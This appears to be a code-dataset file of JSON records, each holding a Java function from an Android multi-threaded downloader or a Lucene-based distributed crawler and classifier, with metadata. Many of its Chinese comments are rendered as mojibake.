{"docstring": "/**\n * taskidurl\u0221\u03e2\n * @param taskId\n * @param url\n * @return\n */\n", "func_signal": "public DownloadInfo getDownloadInfoByTaskIdAndUrl(int taskId, String url)", "code": "{\n    if(TextUtils.isEmpty(url)) {\n        return null;\n    }\n    SQLiteDatabase database = getConnection();\n    DownloadInfo info = null;\n    Cursor cursor = null;\n    try {\n        String sql = \"select * from download_info where url=? and task_id=?\";\n        cursor = database.rawQuery(sql, new String[] { url, String.valueOf(taskId) });\n        if (cursor.moveToNext()) {\n            info = new DownloadInfo();\n            info.setTaskId(cursor.getInt(1));\n            info.setDownloadLength(cursor.getLong(2));\n            info.setDownloadSuccess(cursor.getInt(4));\n            info.setUrl(cursor.getString(3));\n        }\n    } catch (Exception e) {\n        Log.e(TAG, e.getMessage());\n    } finally {\n        if (null != database) {\n            database.close();\n        }\n        if (null != cursor) {\n            cursor.close();\n        }\n    }\n    return info;\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\db\\DownloadInfoDAO.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u8bbe\u7f6e\u4e0b\u8f7d\u72b6\u6001\n * @param status\n */\n", "func_signal": "public void setStatus(int status)", "code": "{\n\tthis.mStatus = status;\n\tpostInvalidate();\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\view\\DownloadPercentView.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u02bc\n */\n", "func_signal": "public void download()", "code": "{\n    if(TextUtils.isEmpty(downloadPath)) {\n        Toast.makeText(context, \"\u03b4\u04b5SD\", Toast.LENGTH_SHORT).show();\n        return;\n    }\n    if(appContent == null) {\n        throw new IllegalArgumentException(\"download content can not be null\");\n    }\n    new Thread() {\n        @Override\n        public void run() {\n            //\u0221\u013c\u0421\n            HttpClient client = new DefaultHttpClient();\n            HttpGet request = new HttpGet(appContent.getUrl());\n            HttpResponse response = null;\n            try {\n                response = client.execute(request);\n                fileLength = response.getEntity().getContentLength();\n            } catch (Exception e) {\n                Log.e(TAG, e.getMessage());\n            } finally {\n                if (request != null) {\n                    request.abort();\n                }\n            }\n            //\u013c\u047e\u0635\u0733\n            List<DownloadInfo> lists = DownloadInfoDAO.getInstance(context.getApplicationContext())\n                    .getDownloadInfosByUrl(appContent.getUrl());\n            for (DownloadInfo info : lists) {\n                downloadLength += info.getDownloadLength();\n            }\n\n            //\u013c\u063c\u00bc\u077f\n            DownloadFileDAO.getInstance(context.getApplicationContext()).insertDownloadFile(appContent);\n            Message.obtain(handler, GET_LENGTH_SUCCESS).sendToTarget();\n        }\n    }.start();\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\downloador\\Downloador.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u03e2\n * @param downloadInfo\n */\n", "func_signal": "public void updateDownloadInfo(DownloadInfo downloadInfo)", "code": "{\n    if(downloadInfo == null) {\n        return;\n    }\n    SQLiteDatabase database = getConnection();\n    try {\n        String sql = \"update download_info set download_length=?, is_success=? where task_id=? and url=?\";\n        Object[] bindArgs = { downloadInfo.getDownloadLength(), downloadInfo.isDownloadSuccess(),\n                downloadInfo.getTaskId(), downloadInfo.getUrl() };\n        database.execSQL(sql, bindArgs);\n    } catch (Exception e) {\n        Log.e(TAG, e.getMessage());\n    } finally {\n        if (null != database) {\n            database.close();\n        }\n    }\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\db\\DownloadInfoDAO.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u7ed8\u5236\u6682\u505c\u65f6\u7684view\n * @param canvas\n */\n", "func_signal": "private void drawPausedView(Canvas canvas)", "code": "{\n\t//\u7ed8\u5236\u7070\u8272\u5706\u73af\n\tcanvas.drawCircle(mXCenter, mYCenter, mRadius - mStrokeWidth/2, mCirclePaint);\n\n\t//\u7ed8\u5236\u8fdb\u5ea6\u6247\u5f62\u5706\u73af\n\tRectF oval = new RectF();\n\t//\u8bbe\u7f6e\u692d\u5706\u4e0a\u4e0b\u5de6\u53f3\u7684\u5750\u6807\n\toval.left = mXCenter - mRadius + mStrokeWidth/2;\n\toval.top = mYCenter - mRadius + mStrokeWidth/2;\n\toval.right = mXCenter + mRadius - mStrokeWidth/2;\n\toval.bottom = mYCenter + mRadius - mStrokeWidth/2;\n\tcanvas.drawArc(oval, -90, ((float) mProgress / mTotalProgress) * 360, false, mRingPaint);\n\n\t//\u7ed8\u5236\u4e2d\u95f4\u6682\u505c\u56fe\u6807\n\tcanvas.drawBitmap(mPausedImg, 0, 0, null);\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\view\\DownloadPercentView.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * viewHolder\n * @param holder\n * @param itemIndex\n */\n", "func_signal": "private void setData(ViewHolder holder, int itemIndex)", "code": "{\n    AppContent appContent = mDates.get(itemIndex);\n    holder.name.setText(appContent.getName());\n    holder.progressBar.setProgress(appContent.getDownloadPercent());\n    setIconByStatus(holder.statusIcon, appContent.getStatus());\n    if(appContent.getStatus() == AppContent.Status.PENDING) {\n        holder.downloadPercent.setVisibility(View.INVISIBLE);\n    } else {\n        holder.downloadPercent.setVisibility(View.VISIBLE);\n        holder.statusIcon.setProgress(appContent.getDownloadPercent());\n        holder.downloadPercent.setText(\"\u063d\u0223\" + appContent.getDownloadPercent() + \"%\");\n    }\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\adapters\\AppContentAdapter.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u66f4\u65b0\u8fdb\u5ea6\n * @param progress\n */\n", "func_signal": "public void setProgress(int progress)", "code": "{\n\tmProgress = progress;\n\tpostInvalidate();\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\view\\DownloadPercentView.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u7ed8\u5236\u4e0b\u8f7d\u4e2d\u7684view\n * @param canvas\n */\n", "func_signal": "private void drawDownloadingView(Canvas canvas)", "code": "{\n\t//\u7ed8\u5236\u7070\u8272\u5706\u73af\n\tcanvas.drawCircle(mXCenter, mYCenter, mRadius - mStrokeWidth/2, mCirclePaint);\n\n\t//\u7ed8\u5236\u8fdb\u5ea6\u6247\u5f62\u5706\u73af\n\tRectF oval = new RectF();\n\t//\u8bbe\u7f6e\u692d\u5706\u4e0a\u4e0b\u5de6\u53f3\u7684\u5750\u6807\n\toval.left = mXCenter - mRadius + mStrokeWidth/2;\n\toval.top = mYCenter - mRadius + mStrokeWidth/2;\n\toval.right = mXCenter + mRadius - mStrokeWidth/2;\n\toval.bottom = mYCenter + mRadius - mStrokeWidth/2;\n\tcanvas.drawArc(oval, -90, ((float)mProgress / mTotalProgress) * 360, false, mRingPaint);\n\n\t//\u7ed8\u5236\u4e2d\u95f4\u767e\u5206\u6bd4\u6587\u5b57\n\tString percentTxt = String.valueOf(mProgress);\n\t//\u8ba1\u7b97\u6587\u5b57\u5782\u76f4\u5c45\u4e2d\u7684baseline\n\tPaint.FontMetricsInt fontMetrics = mTxtPaint.getFontMetricsInt();\n\tfloat baseline = oval.top + (oval.bottom - oval.top - fontMetrics.bottom + fontMetrics.top) / 2 - fontMetrics.top;\n\tcanvas.drawText(percentTxt, mXCenter, baseline, mTxtPaint);\n\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\view\\DownloadPercentView.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u02bcAsyncTask\n */\n", "func_signal": "private void beginDownload()", "code": "{\n    Log.e(TAG, \"beginDownload\" + appContent.getUrl());\n    appContent.setStatus(AppContent.Status.WAITING);\n    long blockLength = fileLength / THREAD_NUM;\n    for (int i = 0; i < THREAD_NUM; i++) {\n        long beginPosition = i * blockLength;//\u00ff\u07f3\u0635\u013f\u02bc\u03bb\n        long endPosition = (i + 1) * blockLength;//\u00ff\u07f3\u0635\u013d\u03bb\n        if (i == (THREAD_NUM - 1)) {\n            endPosition = fileLength;//\u013c\u0134\u0421\u03aa\u07f3\u0338\u04bb\u07f3\u0335\u013d\u03bb\u00fc\u03aa\u013c\u0733\n        }\n        DownloadTask task = new DownloadTask(i, beginPosition, endPosition, this, context);\n        task.executeOnExecutor(THREAD_POOL_EXECUTOR, appContent.getUrl());\n        if(tasks == null) {\n            tasks = new ArrayList<DownloadTask>();\n        }\n        tasks.add(task);\n    }\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\downloador\\Downloador.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u00bd\n */\n", "func_signal": "synchronized public void updateProgress()", "code": "{\n    int percent = (int) Math.ceil((float)mCurrentLength / (float)mFileLength * 100);\n//        Log.i(TAG, \"downloading  \" + mCurrentLength + \",\" + mFileLength + \",\" + percent);\n    if(percent > mProgressBar.getProgress()) {\n        mProgressBar.setProgress(percent);\n        mPercentTV.setText(\"\u063d\u0223\" + percent + \"%\");\n        if (mProgressBar.getProgress() == mProgressBar.getMax()) {\n            Toast.makeText(MainActivity.this, \"\u063d\", Toast.LENGTH_SHORT).show();\n        }\n    }\n}", "path": "multithreaddownload\\src\\main\\java\\com\\bbk\\lling\\multithreaddownload\\MainActivity.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u0221\n * @return\n */\n", "func_signal": "public static List<AppContent> getTestData()", "code": "{\n    List<AppContent> list = new ArrayList<AppContent>();\n    AppContent app1 = new AppContent(\"\u0224\u04ea\", \"http://219.128.78.33/apk.r1.market.hiapk.com/data/upload/apkres/2015/9_25/18/com.lling.qiqu_060245.apk\");\n    list.add(app1);\n    AppContent app2 = new AppContent(\"\u02a6\", \"http://183.57.28.39/apk.r1.market.hiapk.com/data/upload/apkres/2015/9_30/9/com.bbk.cloudteacher_095422.apk\");\n    list.add(app2);\n    AppContent app3 = new AppContent(\"\", \"http://183.62.114.247/m.wdjcdn.com/apk.wdjcdn.com/2/65/61103e72de9d8f95465e68b535559652.apk\");\n    list.add(app3);\n    AppContent app4 = new AppContent(\"\u05b6\", \"http://119.147.254.64/dd.myapp.com/16891/F5151080C8F69D2D992047D19B24C39D.apk\");\n    list.add(app4);\n    AppContent app5 = new AppContent(\"\", \"http://183.61.182.28/m.wdjcdn.com/apk.wdjcdn.com/b/eb/295abecdc49760ed4b74fbc0d36c3ebb.apk\");\n    list.add(app5);\n    AppContent app6 = new AppContent(\"\u0439\", \"http://183.61.182.28/m.wdjcdn.com/apk.wdjcdn.com/8/0b/d7b904d26558ae7e22d1e6ebdf4830b8.apk\");\n    list.add(app6);\n    AppContent app7 = new AppContent(\"\", \"http://14.18.142.20/m.wdjcdn.com/apk.wdjcdn.com/b/a0/e8c01dc875f0c72f4952ce800f3f6a0b.apk\");\n    list.add(app7);\n    AppContent app8 = new AppContent(\"\u012b\", \"http://125.88.65.248/m.wdjcdn.com/apk.wdjcdn.com/3/8d/19e04e8c921e30eaae2dd5835697e8d3.apk\");\n    list.add(app8);\n    AppContent app9 = new AppContent(\"\", \"http://183.61.182.28/m.wdjcdn.com/apk.wdjcdn.com/4/7d/410a086fe71834660e01cecdde55d7d4.apk\");\n    list.add(app9);\n    AppContent app10 = new AppContent(\"\u0435\u02b5\", \"http://14.18.142.20/m.wdjcdn.com/apk.wdjcdn.com/b/4a/ab2001cd8ec89687e34dab51119064ab.apk\");\n    list.add(app10);\n    AppContent app11 = new AppContent(\"\u0732\", \"http://14.18.142.20/m.wdjcdn.com/apk.wdjcdn.com/1/7c/f0276757ab38391ba24489e224ca87c1.apk\");\n    list.add(app11);\n    AppContent app12 = new AppContent(\"\u06b5\", \"http://125.88.65.248/m.wdjcdn.com/apk.wdjcdn.com/6/43/e5f01e24b83295ef6bd04c454377b436.apk\");\n    list.add(app12);\n    AppContent app13 = new AppContent(\"\u04bb\u0175\", \"http://125.88.65.248/m.wdjcdn.com/apk.wdjcdn.com/6/55/188dd88849b9901e3547d9cb104df556.apk\");\n    list.add(app13);\n    return list;\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\utils\\DownloadUtils.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u0363\n */\n", "func_signal": "public void pause()", "code": "{\n    for (DownloadTask task : tasks) {\n        if (task != null && (task.getStatus() == AsyncTask.Status.RUNNING || !task.isCancelled())) {\n            task.cancel(true);\n        }\n    }\n    tasks.clear();\n    appContent.setStatus(AppContent.Status.PAUSED);\n    DownloadFileDAO.getInstance(context.getApplicationContext()).updateDownloadFile(appContent);\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\downloador\\Downloador.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u05b2\u02e2\n * @param view\n * @param itemIndex\n */\n", "func_signal": "public void updateView(View view, int itemIndex)", "code": "{\n    if(view == null) {\n        return;\n    }\n    //view\u0221holder\n    ViewHolder holder = (ViewHolder) view.getTag();\n    holder.statusIcon = (DownloadPercentView) view.findViewById(R.id.status_icon);\n    holder.name = (TextView) view.findViewById(R.id.name);\n    holder.downloadPercent = (TextView) view.findViewById(R.id.download_percent);\n    holder.progressBar = (ProgressBar) view.findViewById(R.id.progressbar);\n    setData(holder, itemIndex);\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\adapters\\AppContentAdapter.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u0634\u0421\n * \u07f3\u0337\n * @param size\n */\n", "func_signal": "protected synchronized void updateDownloadLength(long size)", "code": "{\n    this.downloadLength += size;\n    //\u0368\u05aa\u00bd\n    int percent = (int)((float)downloadLength * 100 / (float)fileLength);\n    appContent.setDownloadPercent(percent);\n    if(percent == 100 || downloadLength == fileLength) {\n        appContent.setDownloadPercent(100); //\u02b1\u0435\ue8ec\u3d7dpercent=99\n        appContent.setStatus(AppContent.Status.FINISHED);\n        DownloadFileDAO.getInstance(context.getApplicationContext()).updateDownloadFile(appContent);\n    }\n    Intent intent = new Intent(Constants.DOWNLOAD_MSG);\n    if(appContent.getStatus() == AppContent.Status.WAITING) {\n        appContent.setStatus(AppContent.Status.DOWNLOADING);\n    }\n    Bundle bundle = new Bundle();\n    bundle.putParcelable(\"appContent\", appContent);\n    intent.putExtras(bundle);\n    context.sendBroadcast(intent);\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\downloador\\Downloador.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u0221\u077f\n * @return\n */\n", "func_signal": "public SQLiteDatabase getConnection()", "code": "{\n    SQLiteDatabase sqliteDatabase = null;\n    try {\n        sqliteDatabase= new DBHelper(context).getReadableDatabase();\n    } catch (Exception e) {\n        Log.e(TAG, e.getMessage());\n    }\n    return sqliteDatabase;\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\db\\DownloadInfoDAO.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u02bc\n * \u0774\u013c\u0421\u00ff\u07f3\u03bb\u00e3AsyncTask\n */\n", "func_signal": "private void beginDownload()", "code": "{\n    mCurrentLength = 0L;\n    mPercentTV.setVisibility(View.VISIBLE);\n    mProgressBar.setProgress(0);\n    long blockLength = mFileLength / DEFAULT_POOL_SIZE;\n    for (int i = 0; i < DEFAULT_POOL_SIZE; i++) {\n        long beginPosition = i * blockLength;//\u00ff\u07f3\u0635\u013f\u02bc\u03bb\n        long endPosition = (i + 1) * blockLength;//\u00ff\u07f3\u0635\u013d\u03bb\n        if (i == (DEFAULT_POOL_SIZE - 1)) {\n            endPosition = mFileLength;//\u013c\u0134\u0421\u03aa\u07f3\u0338\u04bb\u07f3\u0335\u013d\u03bb\u00fc\u03aa\u013c\u0733\n        }\n        DownloadAsyncTask task = new DownloadAsyncTask(beginPosition, endPosition);\n        mTaskList.add(task);\n        task.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, mUrl, String.valueOf(i));\n    }\n}", "path": "multithreaddownload\\src\\main\\java\\com\\bbk\\lling\\multithreaddownload\\MainActivity2.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u00bd\n */\n", "func_signal": "synchronized public void updateProgress()", "code": "{\n    int percent = (int) Math.ceil((float)mCurrentLength / (float)mFileLength * 100);\n    Log.i(TAG, \"downloading  \" + mCurrentLength + \",\" + mFileLength + \",\" + percent);\n    if(percent > mProgressBar.getProgress()) {\n        mProgressBar.setProgress(percent);\n        mPercentTV.setText(\"\u063d\u0223\" + percent + \"%\");\n        if (mProgressBar.getProgress() == mProgressBar.getMax()) {\n            Toast.makeText(MainActivity2.this, \"\u063d\", Toast.LENGTH_SHORT).show();\n        }\n    }\n}", "path": "multithreaddownload\\src\\main\\java\\com\\bbk\\lling\\multithreaddownload\\MainActivity2.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/* (non-Javadoc)\n * @see java.lang.Object#toString()\n */\n", "func_signal": "@Override\npublic String toString()", "code": "{\n\treturn \"PagePOJO [\" + (url != null ? \"url=\" + url + \", \" : \"\") + \"id=\"\n\t\t\t+ id + \", \" + (title != null ? \"title=\" + title + \", \" : \"\")\n\t\t\t+ (content != null ? \"content=\" + content : \"\") + \"]\";\n}", "path": "src\\com\\gs\\crawler\\PagePOJO.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * @return\n */\n", "func_signal": "public String toJson()", "code": "{\n\tGson gson = new Gson();\n\treturn gson.toJson(this);\n\t//return \"{\\\"url\\\":\\\"\"+this.url+\"\\\",\\\"id\\\":\"+this.id+\",\\\"title\\\":\\\"\"+this.title+\"\\\",\\\"content\\\":\\\"\"+this.content+\"\\\"}\";\n}", "path": "src\\com\\gs\\crawler\\PagePOJO.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * \u5bf9processingResult\u8fdb\u884c\u5168\u9762\u7684\u5c55\u793a,\u8f93\u51fa\u81f3\u63a7\u5236\u53f0.\n * @author GS\n * @param processingResult\n */\n", "func_signal": "public static void displayResults(ProcessingResult processingResult)", "code": "{\n    final Collection<Document> documents = processingResult.getDocuments();//\u6240\u6709\u7684\u6587\u6863\n    final Collection<Cluster> clusters = processingResult.getClusters();//\u6240\u6709\u7684\u7c7b\u522b\n    final Map<String, Object> attributes = processingResult.getAttributes();//\u53c2\u6570\n\n    // Show documents\n    if (documents != null)\n    {\n        displayDocuments(documents);//\u6253\u5370\u6240\u6709\u6587\u6863\n    }\n\n    // Show clusters\n    if (clusters != null)\n    {\n        displayClusters(clusters);//\u6253\u5370\u6240\u6709\u5206\u7c7b\n    }\n\n    // Show attributes other attributes\n    displayAttributes(attributes);//\u6253\u5370\u53c2\u6570\n}", "path": "src\\com\\gs\\cluster\\ConsoleFormatter.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * \u663e\u793a\u6b64\u805a\u7c7b\u7ed3\u679c\u7684\u53c2\u6570,\u8f93\u51fa\u81f3\u63a7\u5236\u53f0.\n * @author GS\n * @param attributes\n */\n", "func_signal": "public static void displayAttributes(final Map<String, Object> attributes)", "code": "{\n    System.out.println(\"Attributes:\");\n\n    String DOCUMENTS_ATTRIBUTE = CommonAttributesDescriptor.Keys.DOCUMENTS;\n    String CLUSTERS_ATTRIBUTE = CommonAttributesDescriptor.Keys.CLUSTERS;\n    for (final Map.Entry<String, Object> attribute : attributes.entrySet())\n    {\n        if (!DOCUMENTS_ATTRIBUTE.equals(attribute.getKey())\n            && !CLUSTERS_ATTRIBUTE.equals(attribute.getKey()))\n        {\n            System.out.println(attribute.getKey() + \":   \" + attribute.getValue());\n        }\n    }\n}", "path": "src\\com\\gs\\cluster\\ConsoleFormatter.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * @param indexField\n *            the indexfile\n * @param queryString\n *            the queryString\n * @return list a list of url\n */\n", "func_signal": "public Searcher(String docDirectory, String indexField)", "code": "{\n\tthis.docDirectory = docDirectory;\n\tthis.indexField = indexField;\n}", "path": "src\\com\\gs\\indexer\\Searcher.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * Launch the application.\n */\n", "func_signal": "public static void main(String[] args)", "code": "{\n\tEventQueue.invokeLater(new Runnable() {\n\t\tpublic void run() {\n\t\t\ttry {\n\t\t\t\tMain window = new Main();\n\t\t\t\twindow.frame.setVisible(true);\n\t\t\t} catch (Exception e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\t});\n}", "path": "windowsearcher\\com\\gs\\window\\Main.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n* \u0538\u0131\u0137\u05b4\n* @param text \u0131\n* @param splitToken \u06b7\u05b8\u0131,\"|\"\n* @return \u05b4\u03f5\u0131\n*/\n", "func_signal": "public static String split(String text,String splitToken)", "code": "{\n\tString result = \"\";\n\tIKSegmenter ik = new IKSegmenter(new StringReader(text), true);\n\twhile (true) {\n\t\ttry {\n\t\t\tresult += ik.next().getLexemeText() + splitToken;\n\t\t} catch (NullPointerException e) {\n\t\t\tbreak;\n\t\t} catch(ArrayIndexOutOfBoundsException e){\n\t\t\tSystem.out.println(\"he%%%%%%%%%%%%%%%%%%%%\");\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n        return result;\n}", "path": "src\\com\\gs\\Classifier\\ChineseSpliter.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * \u5bf9\u4e00\u4e2a\u7c7b\u8fdb\u884c\u5c55\u793a.\n * @author GS\n * @param level\n * @param tag\n * @param cluster\n * @param maxNumberOfDocumentsToShow\n * @param clusterDetailsFormatter\n */\n", "func_signal": "private static void displayCluster(final int level, String tag, Cluster cluster,\n    int maxNumberOfDocumentsToShow, ClusterDetailsFormatter clusterDetailsFormatter)", "code": "{\n    final String label = cluster.getLabel();//\u5f53\u524d\u7c7b\u7684\u6807\u9898\n\n    // indent up to level and display this cluster's description phrase\n    for (int i = 0; i < level; i++)\n    {\n        System.out.print(\"  \");\n    }\n    System.out.println(label + \"  \"\n        + clusterDetailsFormatter.formatClusterDetails(cluster));\n\n    // if this cluster has documents, display three topmost documents.\n    int documentsShown = 0;\n    for (final Document document : cluster.getDocuments())\n    {\n        if (documentsShown >= maxNumberOfDocumentsToShow)//\u5982\u679c\u8fbe\u5230\u6700\u5927\u5c55\u793a\u6570\u7684\u8bdd\u4e0d\u518d\u5c55\u793a\n        {\n            break;\n        }\n        displayDocument(level + 1, document);//\u8fd9\u4e2alevel\u662f\u5e72\u561b\u7684?\n        documentsShown++;//\u5f53\u524d\u5206\u7c7b\u5df2\u7ecf\u5c55\u793a\u7684\u6587\u6863\u6570\n    }\n    if (maxNumberOfDocumentsToShow > 0\n        && (cluster.getDocuments().size() > documentsShown))\n    {\n        System.out.println(getIndent(level + 1) + \"... and \"\n            + (cluster.getDocuments().size() - documentsShown) + \" more\\n\");\n    }\n\n    // finally, if this cluster has subclusters, descend into recursion.\n    final int num = 1;\n    for (final Cluster subcluster : cluster.getSubclusters())\n    {\n        displayCluster(level + 1, tag + \".\" + num, subcluster,\n            maxNumberOfDocumentsToShow, clusterDetailsFormatter);\n    }\n}", "path": "src\\com\\gs\\cluster\\ConsoleFormatter.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * @param indexField\n *            the path to save index file\n * @param docsField\n *            the path to take the txts which want to be indexed\n */\n", "func_signal": "public void index(String indexField, String docsField)", "code": "{\n\ttry {\n\t\tDirectory directory = FSDirectory.open(new File(indexField));\n\t\tIndexWriterConfig conf = new IndexWriterConfig(Version.LUCENE_35,\n\t\t\t\tnew IKAnalyzer());\n\t\tIndexWriter writer = new IndexWriter(directory, conf);\n\t\tFile f = new File(docsField);\n\t\tDocument doc;\n\t\tfor (File file : f.listFiles()) {\n\t\t\tlogger.info(\"Indexing   \" + file.getName());\n\t\t\tJsonReader jr = new JsonReader(file);\n\t\t\twhile (jr.hasNext()) {\n\t\t\t\tdoc = new Document();\n\t\t\t\tHit hit = jr.next();\n\t\t\t\tif (hit == null)\n\t\t\t\t\tcontinue;\n\t\t\t\tdoc.add(new Field(\"content\",\n\t\t\t\t\t\thit.getPagePOJO().getContent(), Field.Store.NO,\n\t\t\t\t\t\tField.Index.ANALYZED));\n\t\t\t\tdoc.add(new NumericField(\"startOffset\", Field.Store.YES,\n\t\t\t\t\t\tfalse).setLongValue(hit.getStartOffset()));\n\t\t\t\tdoc.add(new Field(\"filename\", hit.getFileName(),\n\t\t\t\t\t\tField.Store.YES, Field.Index.NOT_ANALYZED));\n\t\t\t\twriter.addDocument(doc);\n\t\t\t}\n\t\t\tjr.close();\n\t\t}\n\t\twriter.close();\n\n\t} catch (CorruptIndexException e) {\n\t\tlogger.error(e.getMessage());\n\t} catch (LockObtainFailedException e) {\n\t\tlogger.error(e.getMessage());\n\t} catch (IOException e) {\n\t\tlogger.error(e.getMessage());\n\t} catch (Exception e) {\n\t\tlogger.error(e.getMessage());\n\t}\n}", "path": "src\\com\\gs\\indexer\\Indexer.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n* \u0638\u00b7\u0131\u013c\n* @param filePath \u0131\u013c\u00b7\n* @return \u0131\n* @throws java.io.FileNotFoundException\n* @throws java.io.IOException\n*/\n", "func_signal": "public static String getText(String filePath) throws FileNotFoundException,IOException", "code": "{\n\n\tInputStreamReader isReader =new InputStreamReader(new FileInputStream(filePath),\"GBK\");\n\tBufferedReader reader = new BufferedReader(isReader);\n\tString aline;\n\tStringBuilder sb = new StringBuilder();\n\n\twhile ((aline = reader.readLine()) != null)\n\t{\n\t\tsb.append(aline + \" \");\n\t}\n\tisReader.close();\n\treader.close();\n\treturn sb.toString();\n}", "path": "src\\com\\gs\\Classifier\\TrainingDataManager.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "//\n", "func_signal": "public ClassifyResult()", "code": "{\n\t\tthis.probility = 0;\n\t\tthis.classification = null;\n\t}", "path": "src\\com\\gs\\Classifier\\ClassifyResult.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * \n */\n", "func_signal": "public URL(String url, int level)", "code": "{\n\tthis.level = level;\n\tthis.url = url;\n}", "path": "src\\com\\gs\\extractor\\URL.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * @param startoffset\n * @param endoffset\n * @param url\n * @param id\n * @param mergepath\n * @param content\n */\n", "func_signal": "public PagePOJO(String url, int id, String content,String title)", "code": "{\n\tthis.url = url;\n\tthis.id = id;\n\tthis.content = content;\n\tthis.title = title;\n}", "path": "src\\com\\gs\\crawler\\PagePOJO.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n* \u0475\u0131\u0435\u0131\u013f\n* @return \u0475\u0131\u0435\u0131\u013f\n*/\n", "func_signal": "public int getTrainingFileCount()", "code": "{\n\tint ret = 0;\n\tfor (int i = 0; i < traningFileClassifications.length; i++)\n\t{\n\t\tret +=getTrainingFileCountOfClassification(traningFileClassifications[i]);\n\t}\n\treturn ret;\n}", "path": "src\\com\\gs\\Classifier\\TrainingDataManager.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
